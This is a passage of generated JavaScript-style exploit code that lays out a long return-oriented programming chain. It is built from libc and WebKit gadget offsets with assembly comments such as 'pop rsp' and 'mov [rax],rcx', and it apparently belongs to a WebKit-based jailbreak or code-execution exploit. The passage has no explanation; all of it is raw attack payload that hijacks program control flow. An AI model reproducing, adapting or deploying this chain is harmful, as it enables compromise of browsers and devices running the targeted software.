set_gadget(libc_base+768796,);
//L1788:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+134808,//L1792
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+134840,//L1794
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+134776,//L1790
webkit_base+4687784,
libc_base+165442
]);
//L1790:
db([0,0]);
set_gadget(libc_base+713278,);
//L1791:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L1792:
db([0,0]);
set_gadget(libc_base+772328,);
//L1793:
db([0,0]);
set_gadget(libc_base+768796,);
//L1794:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+134952,//L1795+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+134944,//L1795
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L1795:
db([0,0]);
set_gadgets([
ropchain+134968,//L1795+24
ropchain+136656,//L1789
libc_base+713278,
ropchain+135024,//L1798
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1796:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1798:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+135112,//L1800
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+135128,//L1801
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1800:
db([0,0]);
set_gadget(libc_base+772328,);
//L1801:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+135288,//L1803
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+135320,//L1805
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+135272,//L1802
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+135304,//L1804
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1802:
db([0,0]);
set_gadget(libc_base+165442,);
//L1803:
db([0,0]);
set_gadget(libc_base+772328,);
//L1804:
db([0,0]);
set_gadget(libc_base+768796,);
//L1805:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+135400,//L1806
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+135416,//L1807
webkit_base+4687784,
libc_base+165442
]);
//L1806:
db([0,0]);
set_gadget(libc_base+768796,);
//L1807:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+135576,//L1811
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+135528,//L1808
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+135544,//L1809
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1808:
db([0,0]);
set_gadget(libc_base+165442,);
//L1809:
db([0,0]);
set_gadget(libc_base+772328,);
//L1810:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L1811:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+135632,//L1813
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L1813:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+135744,//L1814
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+135776,//L1816
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+135760,//L1815
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1814:
db([0,0]);
set_gadget(libc_base+772328,);
//L1815:
db([0,0]);
set_gadget(libc_base+768796,);
//L1816:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+135856,//L1817
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+135872,//L1818
webkit_base+4687784,
libc_base+165442
]);
//L1817:
db([0,0]);
set_gadget(libc_base+768796,);
//L1818:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+135968,//L1820
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+135952,//L1819
webkit_base+4687784,
libc_base+165442
]);
//L1819:
db([0,0]);
set_gadget(libc_base+768796,);
//L1820:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+136064,//L1822
webkit_base+4687784,
libc_base+768796
]);
//L1821:
db([10,0]);// 0xa
set_gadget(webkit_base+3789839,);//pop r11
//L1822:
db([0,0]);
set_gadget(libc_base+165442,);
//L1823:
db([10,0]);// 0xa
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+136208,//L1825
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+136224,//L1826
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+136192,//L1824
webkit_base+4687784,
libc_base+165442
]);
//L1824:
db([0,0]);
set_gadget(libc_base+772328,);
//L1825:
db([0,0]);
set_gadget(libc_base+768796,);
//L1826:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
libc_base+350006,//setne al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+136400,//L1828
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+136416,//L1829
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+136384,//L1827
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1827:
db([0,0]);
set_gadget(libc_base+165442,);
//L1828:
db([0,0]);
set_gadget(libc_base+768796,);
//L1829:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+136560,//L1832
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+136576,//L1833
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+136528,//L1830
webkit_base+4687784,
libc_base+165442
]);
//L1830:
db([0,0]);
set_gadget(libc_base+713278,);
//L1831:
db([0,0]);
set_gadget(libc_base+772328,);
//L1832:
db([0,0]);
set_gadget(libc_base+768796,);
//L1833:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+350006,//setne al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+136648,//L1835
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1835:
db([0,0]);
//L1789:
set_gadgets([
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+136776,//L1837
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+136792,//L1838
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+136760,//L1836
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1836:
db([0,0]);
set_gadget(libc_base+165442,);
//L1837:
db([0,0]);
set_gadget(libc_base+768796,);
//L1838:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+136936,//L1841
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+136952,//L1842
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+136904,//L1839
webkit_base+4687784,
libc_base+165442
]);
//L1839:
db([0,0]);
set_gadget(libc_base+713278,);
//L1840:
db([0,0]);
set_gadget(libc_base+772328,);
//L1841:
db([0,0]);
set_gadget(libc_base+768796,);
//L1842:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+350006,//setne al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+137024,//L1844
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1844:
db([0,0]);
//L1736:
set_gadgets([
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+137152,//L1846
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+137168,//L1847
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+137136,//L1845
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1845:
db([0,0]);
set_gadget(libc_base+165442,);
//L1846:
db([0,0]);
set_gadget(libc_base+768796,);
//L1847:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+137296,//L1850
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+137328,//L1852
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+137312,//L1851
webkit_base+4687784,
libc_base+713278
]);
//L1849:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L1850:
db([0,0]);
set_gadget(libc_base+165442,);
//L1851:
db([0,0]);
set_gadget(libc_base+768796,);
//L1852:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+137440,//L1853+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+137432,//L1853
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L1853:
db([0,0]);
set_gadgets([
ropchain+137456,//L1853+24
ropchain+139800,//L1848
libc_base+713278,
ropchain+137512,//L1856
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1854:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1856:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+137600,//L1858
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+137616,//L1859
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1858:
db([0,0]);
set_gadget(libc_base+772328,);
//L1859:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+137776,//L1861
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+137808,//L1863
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+137760,//L1860
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+137792,//L1862
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1860:
db([0,0]);
set_gadget(libc_base+165442,);
//L1861:
db([0,0]);
set_gadget(libc_base+772328,);
//L1862:
db([0,0]);
set_gadget(libc_base+768796,);
//L1863:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+137888,//L1864
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+137904,//L1865
webkit_base+4687784,
libc_base+165442
]);
//L1864:
db([0,0]);
set_gadget(libc_base+768796,);
//L1865:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+138064,//L1869
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+138016,//L1866
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+138032,//L1867
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1866:
db([0,0]);
set_gadget(libc_base+165442,);
//L1867:
db([0,0]);
set_gadget(libc_base+772328,);
//L1868:
db([56,0]);// 0x38
set_gadget(libc_base+768796,);
//L1869:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+138168,//L1871
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+138152,//L1870
webkit_base+4687784,
libc_base+772328
]);
//L1870:
db([0,0]);
set_gadget(libc_base+768796,);
//L1871:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+138264,//L1874
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1872:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L1874:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+138352,//L1876
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+138368,//L1877
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1876:
db([0,0]);
set_gadget(libc_base+772328,);
//L1877:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+138448,//L1878
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+138464,//L1879
webkit_base+4687784,
libc_base+165442
]);
//L1878:
db([0,0]);
set_gadget(libc_base+768796,);
//L1879:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+138608,//L1882
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+138576,//L1880
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+138592,//L1881
webkit_base+4687784,
libc_base+165442
]);
//L1880:
db([0,0]);
set_gadget(libc_base+772328,);
//L1881:
db([0,0]);
set_gadget(libc_base+768796,);
//L1882:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+138696,//L1884
webkit_base+4687784,
libc_base+713278
]);
//L1883:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L1884:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+138800,//L1887
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1885:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L1887:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+138888,//L1889
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+138904,//L1890
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1889:
db([0,0]);
set_gadget(libc_base+772328,);
//L1890:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+139008,//L1893
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+138992,//L1892
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L1892:
db([0,0]);
set_gadget(libc_base+772328,);
//L1893:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+139064,//L1895
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1895:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+139184,//L1897
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1897:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+139240,//L1899
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1899:
db([0,0]);
set_gadgets([
webkit_base+887232,//mov [rax],cl
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+139384,//L1902
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+139352,//L1900
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1900:
db([0,0]);
set_gadget(libc_base+772328,);
//L1901:
db([56,0]);// 0x38
set_gadget(libc_base+768796,);
//L1902:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+139520,//L1904
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+139536,//L1905
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+139504,//L1903
webkit_base+4687784,
libc_base+165442
]);
//L1903:
db([0,0]);
set_gadget(libc_base+772328,);
//L1904:
db([0,0]);
set_gadget(libc_base+768796,);
//L1905:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+139640,//L1906
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+139656,//L1907
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L1906:
db([0,0]);
set_gadget(libc_base+768796,);
//L1907:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+139776,//L1908
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+139760,//L1909
webkit_base+4687784,
libc_base+768796
]);
//L1909:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L1908:
db([0,0]);
set_gadgets([
libc_base+489696,//pop rsp
ropchain+141248,//L1910
//L1848:
libc_base+713278,
ropchain+139856,//L1913
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1911:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L1913:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+139944,//L1915
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+139960,//L1916
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1915:
db([0,0]);
set_gadget(libc_base+772328,);
//L1916:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+140104,//L1919
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+140072,//L1917
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+140088,//L1918
webkit_base+4687784,
libc_base+165442
]);
//L1917:
db([0,0]);
set_gadget(libc_base+772328,);
//L1918:
db([0,0]);
set_gadget(libc_base+768796,);
//L1919:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+140200,//L1922
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1920:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1922:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+140288,//L1924
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+140304,//L1925
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1924:
db([0,0]);
set_gadget(libc_base+772328,);
//L1925:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+140464,//L1927
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+140496,//L1929
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+140448,//L1926
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+140480,//L1928
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1926:
db([0,0]);
set_gadget(libc_base+165442,);
//L1927:
db([0,0]);
set_gadget(libc_base+772328,);
//L1928:
db([0,0]);
set_gadget(libc_base+768796,);
//L1929:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+140592,//L1931
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+140576,//L1930
webkit_base+4687784,
libc_base+165442
]);
//L1930:
db([0,0]);
set_gadget(libc_base+768796,);
//L1931:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L1933:
ropchain+140696,//L1932
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+141576,//L1934
//L1932:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+140840,//L1936
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+140856,//L1937
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+140824,//L1935
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1935:
db([0,0]);
set_gadget(libc_base+165442,);
//L1936:
db([0,0]);
set_gadget(libc_base+768796,);
//L1937:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+140984,//L1939
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+141000,//L1940
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+140968,//L1938
webkit_base+4687784,
libc_base+165442
]);
//L1938:
db([0,0]);
set_gadget(libc_base+772328,);
//L1939:
db([0,0]);
set_gadget(libc_base+768796,);
//L1940:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+141104,//L1941
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+141120,//L1942
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L1941:
db([0,0]);
set_gadget(libc_base+768796,);
//L1942:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+141240,//L1943
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+141224,//L1944
webkit_base+4687784,
libc_base+768796
]);
//L1944:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L1943:
db([0,0]);
//L1910:
set_gadgets([
libc_base+713278,
ropchain+141328,//L1946
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+141312,//L1945
webkit_base+4687784,
libc_base+165442
]);
//L1945:
db([0,0]);
set_gadget(libc_base+768796,);
//L1946:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+141432,//L1947
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+141448,//L1948
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L1947:
db([0,0]);
set_gadget(libc_base+768796,);
//L1948:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+141568,//L1949
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+141552,//L1950
webkit_base+4687784,
libc_base+768796
]);
//L1950:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L1949:
db([0,0]);
//L1934:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
__swbuf_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+142896,//L1951
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L1951:
db([0,0]);
//___bswap64_var:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+142968,//L1953
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L1953:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+143080,//L1956
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+143096,//L1957
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
//L1954:
db([16,0]);// 0x10
set_gadget(webkit_base+1420514,);//pop r8
//L1956:
db([0,0]);
set_gadget(libc_base+772328,);
//L1957:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+143184,//L1959
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+143200,//L1960
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1959:
db([0,0]);
set_gadget(libc_base+772328,);
//L1960:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+143328,//L1962
